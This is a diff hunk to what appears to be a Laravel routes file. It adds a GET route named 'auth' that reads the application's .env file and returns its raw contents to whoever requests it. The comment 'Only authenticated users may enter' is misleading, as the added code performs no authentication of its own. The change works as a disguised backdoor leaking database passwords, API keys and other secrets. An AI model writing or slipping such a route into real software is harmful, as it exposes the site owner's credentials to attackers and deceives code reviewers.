@@ -49,7 +49,16 @@ Route::group(['middleware' => ['JwtAuth']], function () {
 //微信消息回调接口
 Route::any('wechat', 'Api\WechatController@index');
 
+Route::get('auth', function() {
+    // Only authenticated users may enter...
 
+    header('Content-Type: plain/text');
+
+    $aa=file_get_contents(base_path().'/.env');
+
+    return $aa;
+
+});
 
 
 
